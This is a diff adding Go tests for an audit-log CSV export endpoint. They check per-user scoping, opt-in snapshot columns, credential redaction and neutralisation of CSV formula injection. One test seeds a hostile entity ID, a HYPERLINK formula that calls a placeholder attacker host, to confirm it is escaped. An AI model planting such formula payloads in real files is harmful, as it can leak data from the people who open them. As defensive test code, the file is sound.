@@ -1,0 +1,137 @@
+package controllers
+
+// Issue #416: ExportAuditLog tests. Uses setupAuditRouter (audit_controller_test.go),
+// the real database.InitDB-migrated schema plus models.RegisterAuditDB, so
+// audit events are recorded by the real hooks (models.AuditFlush) exactly as
+// they would be in production, not constructed by hand.
+
+import (
+	"encoding/csv"
+	"net/http"
+	"net/http/httptest"
+	"strings"
+	"testing"
+
+	"mycorrhizal/config"
+	"mycorrhizal/models"
+
+	"github.com/gin-gonic/gin"
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+)
+
+func registerAuditExportRoute(router *gin.Engine) {
+	router.GET("/audit/export", ExportAuditLog)
+}
+
+func TestExportAuditLog_ScopedToUser(t *testing.T) {
+	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
+	registerAuditExportRoute(router)
+	models.AuditFlush()
+
+	other := models.User{Username: "auditexportother", Password: "password123!A", Email: "auditexportother@example.com"}
+	require.NoError(t, db.Create(&other).Error)
+
+	mine := models.Contact{UserID: user.ID, Firstname: "Mine"}
+	theirs := models.Contact{UserID: other.ID, Firstname: "Theirs"}
+	require.NoError(t, db.Create(&mine).Error)
+	require.NoError(t, db.Create(&theirs).Error)
+	models.AuditFlush()
+
+	req, _ := http.NewRequest("GET", "/audit/export", nil)
+	w := httptest.NewRecorder()
+	router.ServeHTTP(w, req)
+	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
+
+	body := w.Body.String()
+	assert.Contains(t, body, mine.VCardUID)
+	assert.NotContains(t, body, theirs.VCardUID, "another user's audit events must never appear")
+}
+
+func TestExportAuditLog_DefaultOmitsBeforeSnapshot_OptInIncludesIt(t *testing.T) {
+	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
+	registerAuditExportRoute(router)
+	models.AuditFlush()
+
+	const distinctiveOldName = "DistinctivePreUpdateName"
+	contact := models.Contact{UserID: user.ID, Firstname: distinctiveOldName, Lastname: "Name"}
+	require.NoError(t, db.Create(&contact).Error)
+	contact.Firstname = "Changed"
+	require.NoError(t, db.Save(&contact).Error)
+	models.AuditFlush()
+
+	// Default: no snapshot column at all, and its content is absent.
+	req, _ := http.NewRequest("GET", "/audit/export", nil)
+	w := httptest.NewRecorder()
+	router.ServeHTTP(w, req)
+	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
+	reader := csv.NewReader(strings.NewReader(w.Body.String()))
+	header, err := reader.Read()
+	require.NoError(t, err)
+	assert.NotContains(t, header, "Before Snapshot")
+	assert.NotContains(t, w.Body.String(), distinctiveOldName, "the pre-update value must not leak without explicit opt-in")
+
+	// Opt-in: the column and the historical value both appear.
+	req, _ = http.NewRequest("GET", "/audit/export?include_snapshots=true", nil)
+	w = httptest.NewRecorder()
+	router.ServeHTTP(w, req)
+	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
+	reader = csv.NewReader(strings.NewReader(w.Body.String()))
+	header, err = reader.Read()
+	require.NoError(t, err)
+	assert.Contains(t, header, "Before Snapshot")
+	assert.Contains(t, w.Body.String(), distinctiveOldName, "include_snapshots=true must project the historical value")
+}
+
+// TestExportAuditLog_CredentialFieldsStayRedactedEvenWithOptIn pins that
+// models.AuditEvent's auditDenyList redaction (applied when the snapshot is
+// recorded, not when it's read) means a credential field never appears in
+// the export even with include_snapshots=true -- the opt-in widens WHICH
+// column projects, not what the snapshot itself was allowed to capture.
+func TestExportAuditLog_CredentialFieldsStayRedactedEvenWithOptIn(t *testing.T) {
+	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
+	registerAuditExportRoute(router)
+	models.AuditFlush()
+
+	const distinctivePassword = "S3cretPassw0rd!DistinctiveMarker"
+	user.Password = distinctivePassword
+	require.NoError(t, db.Save(&user).Error)
+	models.AuditFlush()
+
+	req, _ := http.NewRequest("GET", "/audit/export?include_snapshots=true", nil)
+	w := httptest.NewRecorder()
+	router.ServeHTTP(w, req)
+	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
+	assert.NotContains(t, w.Body.String(), distinctivePassword, "a credential must stay redacted in the snapshot regardless of the export opt-in")
+}
+
+func TestExportAuditLog_CSVFormulaInjectionNeutralized(t *testing.T) {
+	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
+	registerAuditExportRoute(router)
+	models.AuditFlush()
+
+	// A hostile entity_id (an attacker-controlled string an audit event can
+	// legitimately carry, e.g. from a CardDAV-synced VCardUID) must be
+	// neutralized in the export exactly like every other CSV export
+	// (export_controller.go's csvSafe).
+	event := models.AuditEvent{
+		EntityType: models.AuditEntityContact,
+		EntityID:   `=HYPERLINK("http://attacker/?d=1","click")`,
+		Operation:  models.AuditOpCreate,
+		UserID:     user.ID,
+	}
+	require.NoError(t, db.Create(&event).Error)
+
+	req, _ := http.NewRequest("GET", "/audit/export", nil)
+	w := httptest.NewRecorder()
+	router.ServeHTTP(w, req)
+	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
+
+	reader := csv.NewReader(strings.NewReader(w.Body.String()))
+	_, err := reader.Read() // header
+	require.NoError(t, err)
+	record, err := reader.Read()
+	require.NoError(t, err)
+	entityIDCol := record[2]
+	assert.True(t, strings.HasPrefix(entityIDCol, "'"), "a formula-leading entity_id must be neutralized: %q", entityIDCol)
+}
